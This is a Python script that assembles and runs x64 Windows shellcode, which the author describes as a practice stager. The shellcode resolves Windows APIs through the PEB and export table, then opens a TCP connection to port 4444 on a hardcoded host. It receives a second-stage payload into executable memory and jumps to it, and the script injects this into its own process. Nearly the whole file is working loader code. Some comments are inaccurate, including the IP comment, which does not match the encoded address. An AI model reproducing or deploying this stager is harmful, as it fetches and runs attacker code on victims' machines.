import ctypes, struct
import binascii
import os
import subprocess
from keystone import *
 
# I've built this mockup stager for practice. It does no looping or hashing, so the result is roughly 2.5 kilobytes, which is massive for a staged payload
# In a separate file I'm going to try my hand at building a stager using loops and hashing the functions we import

# However quick rundown of this file:
# 1. Load kernel32.dll export table to get LoadLibraryA, GetProcAddress, and VirtualAlloc
# 2. Using GetProcAddr and LoadLibraryA we find functions in WS2_32.dll (socket, connect, recv)
# 3. Load and call each one into memory
# 4. We download the .bin file using recv() into the RWX buffer (from VirtualAlloc) and execute

def main():
    SHELLCODE = (

" start: "
"   sub rsp, 0x208;"                 # Make some room on the stack (hard to see but its the same as 0x208, to avoid null bytes)


# Find DllBase of kernel32.dll
" locate_kernel32:"
"   xor rcx, rcx;"                  # Zero RCX contents
"   mov rax, gs:[rcx + 0x60];"      # 0x060 ProcessEnvironmentBlock to RAX.
"   mov rax, [rax + 0x18];"         # 0x18  ProcessEnvironmentBlock.Ldr Offset
"   mov rsi, [rax + 0x20];"         # 0x20 Offset = ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList
"   lodsq;"                         # Load qword at address (R)SI into RAX (ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList)
"   xchg rax, rsi;"                 # Swap RAX,RSI
"   lodsq;"                         # Load qword at address (R)SI into RAX
"   mov rbx, [rax + 0x20] ;"        # RBX = Kernel32 base address
"   mov r8, rbx; "                  # Copy Kernel32 base address to R8 register

# Finding the export address table of kernel32.dll
"   mov ebx, [rbx+0x3C];"
"   add rbx, r8;"                   # r8 was the copy of our kernel32.dll base
"   xor r12, r12; "
"   add r12, 0x88FFFFF;"            # Avoiding the use of null-bytes in our shellcode
"   shr r12, 0x14;"                 # Same thing
"   mov edx, [rbx+r12];"            # This jumps us from NT_HEADERS -> Export Address Table. Its hard to read because we 
                                    # manipulate the previous two instructions to avoid null-bytes. The offset is 0x88
"   add rdx, r8;"                   # To find the VMA, we do: kernel32.dll + RVA. r8 still holds dllbase and rdx holds the rva of the export table
                                    # RDX now holds the value of IMAGE_EXPORT_DIRECTORY struct

                                    # Its hard to tell, but we just need to read the AddressOfFunctions
                                    # But to get there, it takes input from AddressOfNameOrdinals, which takes input from AddressOfNames
                                    # We have to know how many times to loop over it with NumberOfFunctions

"   mov r10d, [rdx+0x14];"          # Offset to number of functions (RVA)
"   xor r11, r11;"
"   mov r11d, [rdx+0x20];"          # Offset to AddressOfNames (RVA)
"   add r11, r8;"                   # Address of names (VMA)

# Now we can begin looping, but we need the value stored in r10 (Number of Functions)
"   mov rcx, r10;"
"kernel32findfunction: "
"   jecxz FunctionNameFound;"       # Once this evaluates to true, we start this function (written below)
"   xor ebx,ebx;"                      
"   mov ebx, [r11+4+rcx*4];"        # RCX is our counter (Number of Functions). We times it by 4 (since each memory address is offset by 4)
                                    # r11 + 4 because there is no function at 0. 
"   add rbx, r8;"                   # r8 = DllBase for kernel32.dll, rbx = Function Name VMA (remember we zeroed out ebx)
"   dec rcx;"                       # Decrement the loop counter (if there are 100 functions, on first loop we now have 99)
"   mov rax, 0x41636f7250746547;"   # GetProcA (It's shifted to avoid null bytes), change this to what function you want to find
# "   shr rax, 0x8;"                  # Now we shift it back into place (again, to avoid null bytes), will have to change this as well depending on the funciton youre calling
"   cmp [rbx], rax;"                # If this evaluates to true, then we run the function
"   jnz kernel32findfunction;"

# Once we find the function we want, we have to pass AddressOfFunctions all the data it needs in order to get the function address (to then call it)
"FunctionNameFound:"
"   inc rcx;"                       # In the loop we dec rcx, so we have to add 1 back to it
"   xor r11, r11;"
"   mov r11d, [rdx+0x24];"          # rdx = Export Address Table (So r11 = RVA of AddressOfNameOrdinals)
"   add r11, r8;"                   # now r11 holds the VMA of AddressOfNameOrdianls
"   mov r13w, [r11+rcx*2];"         # rcx = The function index number * 2 (remember it was our counter in the loop)
                                    # So, r13 holds AddressOfNameOrdianls, which we pass into AddressOfFunctions to get (and finally) import/use the function

"   xor r11, r11;"                   
"   mov r11d, [rdx+0x1c];"          # rdx = Export Address Table (So r11 = RVA of AddressOfFunctions)
"   add r11, r8;"                   # now r11 holds the VMA of AddressOfFunctions
"   mov eax, [r11+4+r13*4]; "         # It reads: (r11 + 4 + (r13 * 4)) for clarity. 
                                    # r13 = Function index number (times by 4)
"   add rax, r8;"                   # VMA of AddressOfFunctions
"   mov r14, rax; "                   # Store a copy of the function we finally found
                                    # From here, we supply the arguments needed to call the function, and then call r14. DONE. 
"   mov rbx, r8; "


# Push the string LoadLibraryA onto the stack
"mov rcx, 0x41797261; "
"push rcx; "
"mov rcx, 0x7262694c64616f4c; "
"push rcx ;"

"mov rdx, rsp ;"                     # RSP was pointing to our LoadLibraryA string. RDX now holds this value (In order to call GetProcAddress)
"mov rcx, r8 ;"                      # Putting the base address of kernel32 into rcx (In order to call GetProcAddress)
"sub rsp, 0x30 ;"                    # Make room on stack
"call r14 ;"                         # Call function
"add rsp, 0x30 ;"                    # Remove allocated stack space
"add rsp, 0x10 ;"                    # Remove LoadLibrary string (that we put on the stack earlier)
"mov rsi, rax ;"                     # Now RSI points to loadlibrary




"mov rax, 0x0000000000006c6c; "
"push rax;"

"mov rax, 0x642e32335f325357; "
"push rax; "

"mov rcx, rsp; "
"sub rsp, 0x30; "                   # Shadow space (making room on the stack)
"call rsi; "                        # Call LoadLibraryA
"add rsp, 0x30; "                   # Clean allocated space previously
"add rsp, 0x10; "                   # Clean space for ws2_32.dll
"mov r15, rax; "                    # The return address of LoadLibraryA is stored in RAX, so we put it into r15. 
                                    # r15 now holds the handle to the DLL


############

# Now that we have ws2_32.dll in r15, we need to find WSAStartup (It always needs to be called before using any funcitons in this DLL)
"xor rax, rax; "
"mov rax, 0x7075; "                 # ASCII String for "up"
"push rax;"
"mov rax, 0x7472617453415357;"      # ASCII String for "WSAStart"
"push rax;"

"mov rdx, rsp; "                    # rsp was pointing at our "WSAStartup" string on the stack, and rdx is our first argument for GetProcAddress
"mov rcx, r15; "                    # r15 is pointing to the WS2_32.dll address, so rcx gets it as it's second arguement for GetProcAddress
"sub rsp, 0x30; "                    # Shadow space (making room on the stack)
"call r14; "                        # r14 is still pointing to GetProcAddress
"add rsp, 0x30; "                   # Cleanup space on stack
"add rsp, 0x10; "                   # Remove Allocated LoadLibrary string on the stack
"mov r12, rax; "                    # The return address of WSAStartup was stored in rax, we are storing a copy of it on r12



# Initialize (call) WSAStarup
"xor rcx, rcx; "
"mov cx, 0x0202; "                  # Version 2.2 (our first arg)
"sub rsp, 0x200; "                  # Allocate 128 bytes for WSADATA
"lea rdx, [rsp]; "                  # lpWSAData (our second arg)
"sub rsp, 0x30; "                   # Shadow space
"call r12; "                        # Call WSAStartup
"add rsp, 0x230; "                  # Cleaning up space on the stack




# Now we can find socket
"xor rax, rax; "
"mov rax, 0x74656b636f73;"          # ASCII string for "socket"
"push rax;"
"mov rdx, rsp; "                    # rsp is pointing to the ascii string, and rdx is our first arg
"mov rcx, r15; "                    # r15 is pointint to WS2_32.dll, and rcx is our second arg
"sub rsp, 0x28; "                   # Shadow space
"call r14; "                        # r14 is still GetProcAddress
"add rsp, 0x28; "                   # Cleanup Stack
"add rsp, 0x8; "
"mov r10, rax; "                    # Copy of socket() function into r10      



# Now we call socket(af=AF_INET,type=SOCK_STREAM,protocol=IPPROTO_TCP)
"xor rcx, rcx; "                     
"mov cl, 2; "                       # AF_INET  
"xor rdx, rdx; "
"mov dl, 1; "                       # SOCK_STREAM
"xor r8, r8; "                      # zero r8 for use. 
"mov r8b, 6; "                      # IPPROTO_TCP
"sub rsp, 0x20; "
"call r10; "                        # Call socket(2, 1, 6)
"add rsp, 0x20; "
"mov r13, rax; "                    # The socket handle is saved in r13



# Now we find connect
"xor rax, rax; "
"mov rax, 0x007463656e6e6f63; "        # ASCII string for "connect"
"push rax;"
"mov rdx, rsp; "                    # rsp is pointing to the ascii string, and rdx is our first arg
"mov rcx, r15; "                    # r15 is pointing to ws2_32.dll, and rcx is our second arg
"sub rsp, 0x28; "                   # Shadow space
"call r14; "                        # r14 is still GetProcAddress
"add rsp, 0x28; "                   # Cleanup shadow space
"add rsp, 0x8; "                    # cleanup connect ascii bytes
"mov r9, rax; "



############################


# Now we build the struct for the second arg
"sub rsp, 0x10; "                       # 32 bytes of shadow space
"lea rdx, [rsp]; "                      # RDX points to start of sockaddr_in

"mov word ptr [rsp], 2; "               # Input 2 into the first arg (uses 2 bytes)
"mov word ptr [rsp+2], 0x5c11; "        # Port 4444, (offset of 2 bytes) second arg
"mov dword ptr [rsp+4], 0xF401A8C0;"    # IP 127.0.0.1 (offset 4 bytes), third arg

"xor rax,rax; "                         # Zero RAX
"mov qword ptr [rsp+8], rax; "                      # Move 8 bytes of the zeroed RAX into the last arg




############################

# Call connect()
"mov rcx, r13; "                    # Socket handle
"lea rdx, [rsp]; "                  # pointer to sockaddr_in we built on the stack
"mov r8d, 0x10; "                   # struct size (16 bytes)
"sub rsp, 0x20; "                   # shadow space

"call r9; "                         # Calling connect()

"add rsp, 0x20; "                   # Clean shadow space
"add rsp, 0x10; "                   # clean sockaddr struct



###########################################

# Now we find recv
"xor rax, rax; "                    # Just look at the two other examples for how I did this
"mov rax, 0x76636572;" 
"push rax;"
"mov rdx, rsp; "
"mov rcx, r15; "
"sub rsp, 0x30; "
"call r14; "
"add rsp, 0x30; "
"add rsp, 0x10; "
"mov r12, rax; "



# Find VirtualAlloc
"xor rax, rax; "                    # Just look at the two other examples for how I did this
"mov rax, 0x00000000636f6c6c; "             # 'cllo' (part of 'VirtualAlloc')"
"push rax;"
"mov rax, 0x416c617574726956; "     # 'VirtualA'"
"push rax;"
"mov rdx, rsp; "
"mov rcx, rbx; "
"sub rsp, 0x30; "
"call r14; "
"add rsp, 0x30; "
"add rsp, 0x10; "
"mov r10, rax; "



# Call VirtualAlloc
"xor rcx, rcx; "
"mov rdx, 0x2000; "                 # dwSize || Allocate 8192 bytes of memory
"mov r8d, 0x3000; "                 # MEM_COMMIT | MEM_RESERVE
"mov r9d, 0x40; "                   # PAGE_EXECUTE_READWRITE
"sub rsp, 0x20; "                   # Shadow space
"call r10; "
"add rsp, 0x20; "

"mov rsi, rax; "                    # rsi = pointer to RWX buffer

# Call recv()

"mov rcx, r13; "                    # socket
"lea rdx, [rsi]; "                  # buffer
"mov r8d, 0x1FE; "                  # Length = 510 bytes
"xor r9d, r9d; "                    # flags = 0
"sub rsp, 0x20; "                   # shadow space
"call r12; "                        
"add rsp, 0x20; "

"mov rax, rsi; "
"jmp rax; "


    )
 
    # Initialize engine in 64-Bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    instructions, count = ks.asm(SHELLCODE)
 
    sh = b""
    output = ""
    for opcode in instructions:
        sh += struct.pack("B", opcode)                          # To encode for execution
        output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
 
 
    shellcode = bytearray(sh)
    print("Shellcode: " + output )
    print(len(output))
 
    print("Attaching debugger to " + str(os.getpid()));
    subprocess.Popen(["WinDbgX", "/g","/p", str(os.getpid())], shell=True)
    input("Press any key to continue...");
 
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlCopyMemory.argtypes = ( ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t ) 
    ctypes.windll.kernel32.CreateThread.argtypes = ( ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int) ) 
 
    space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buff = ( ctypes.c_char * len(shellcode) ).from_buffer_copy( shellcode )
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space),buff,ctypes.c_int(len(shellcode)))
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_void_p(space),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1);
 
if __name__ == "__main__":
    main()